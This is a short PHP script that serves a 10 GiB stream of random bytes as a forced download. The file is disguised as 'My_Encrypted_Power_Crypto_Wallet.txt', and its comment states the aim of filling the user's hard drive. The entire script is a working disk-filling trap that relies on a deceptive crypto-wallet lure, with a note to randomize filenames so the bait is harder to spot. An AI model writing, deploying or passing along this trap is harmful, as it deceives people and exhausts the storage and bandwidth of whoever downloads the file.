<?php
// Fill users HD with large files. 
// Todo: add filename randomization

// 10 GiB in bytes
$limit = 10 * 1024 * 1024 * 1024; // 10 * 1024^3 = 10737418240

if (PHP_INT_SIZE < 8) {
        header('Content-Type: text/plain; charset=utf-8');
    //echo "Warning: running on 32-bit PHP; large Content-Length values may not be supported.\n";
    }

$randomPath = '/dev/urandom'; // use /dev/random only if you really want blocking behavior

// Set headers for download
header('Content-Type: application/octet-stream');
header('Content-Disposition: attachment; filename="My_Encrypted_Power_Crypto_Wallet.txt"');
if (PHP_INT_SIZE >= 8) {
    header('Content-Length: ' . (string)$limit);
}
header('Content-Transfer-Encoding: binary');
header('Cache-Control: no-cache, must-revalidate');
header('Pragma: no-cache');

set_time_limit(0);          // prevent PHP timeout
@ob_end_flush();           // disable output buffering if any
flush();

$fh = fopen($randomPath, 'rb');
if ($fh === false) {
    http_response_code(500);
    echo "Unable to open random source ($randomPath)";
    exit;
}

$bytesSent = 0;
$chunkSize = 8192; // read in 8 KiB blocks (tune as desired)

while ($bytesSent < $limit && !connection_aborted()) {
    $toRead = (int) min($chunkSize, $limit - $bytesSent);
    $data = fread($fh, $toRead);
    if ($data === false || $data === '') {
        // Something went wrong reading random source
        break;
    }

    $len = strlen($data);
    echo $data;
    $bytesSent += $len;
    flush();
}

fclose($fh);
exit;
?>
